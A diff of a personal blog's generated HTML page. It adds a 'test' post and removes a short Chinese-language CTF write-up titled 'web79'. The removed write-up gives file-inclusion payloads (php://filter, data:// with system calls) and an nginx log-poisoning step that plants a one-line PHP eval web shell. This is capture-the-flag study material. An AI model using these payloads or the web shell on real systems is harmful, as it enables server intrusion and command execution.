@@ -71,6 +71,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/21/test/" class="article-date">
+  <time class="dt-published" datetime="2025-04-21T02:24:21.000Z" itemprop="datePublished">2025-04-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/21/test/">test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="/2025/04/21/test/imgs/$%7Bfiilename%7D/image-20250421102433267.png" alt="image-20250421102433267"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/21/test/" data-id="cm9qgdu5r000038uoc1h4154y" data-title="test" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web81" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/19/web81/" class="article-date">
@@ -132,8 +171,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>123</p>
-<p><img src="/2025/04/19/1/imgs/$%7Bfiilename%7D/78-1745067359365-1.png"></p>
+        <p><img src="/2025/04/19/1/imgs/$%7Bfiilename%7D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-19%20215732.png"></p>
 
       
     </div>
@@ -426,53 +464,6 @@
 
 
   
-    <article id="post-web79" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/16/web79/" class="article-date">
-  <time class="dt-published" datetime="2025-04-16T12:56:17.000Z" itemprop="datePublished">2025-04-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/16/web79/">web79</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="/2025/04/16/web79/$%7Bfiilename%7D/79.png"></p>
-<p>78 看到include 文件包含伪协议 ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system(‘tac flag.php’);?> 使用单引号而不用双引号 因为会被变量解析</p>
-<p><img src="/2025/04/16/web79/$%7Bfiilename%7D/79-1744808487464-2.png"></p>
-<p>79 过滤了php 用data  ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac flag*');?> </p>
-<p>这里&lt;?&#x3D;system就等于&lt;?&#x3D;php system</p>
-<p> <img src="/2025/04/16/web79/$%7Bfiilename%7D/80.png"></p>
-<p>80 php和data都被过滤了，伪协议用不了了，这里学会了一个新的 日志包含漏洞，下载一个新插件Wappalyzer 工具来探测服务器相关技术信息 发现是nginx 查它的日志 ?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F; 还有一个存放错误的路径&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log 然后发现可以查询，bp抓包，上传一个一句话木马<?php @eval($_REQUEST['cmd']);?></p>
-<p>，再用hackbar post  cmd&#x3D;systwm(‘ls’);看到有fl0g.php  cmd&#x3D;system(‘tac fl0g.php’)。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/16/web79/" data-id="cm9oa68ey000ehguoah5h0jip" data-title="web79" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -509,6 +500,10 @@
       <ul>
         
           <li>
+            <a href="/2025/04/21/test/">test</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/19/web81/">web81</a>
           </li>
         
@@ -522,10 +517,6 @@
         
           <li>
             <a href="/2025/04/19/web80/">web80</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/19/web78/">web78</a>
           </li>
         
       </ul>
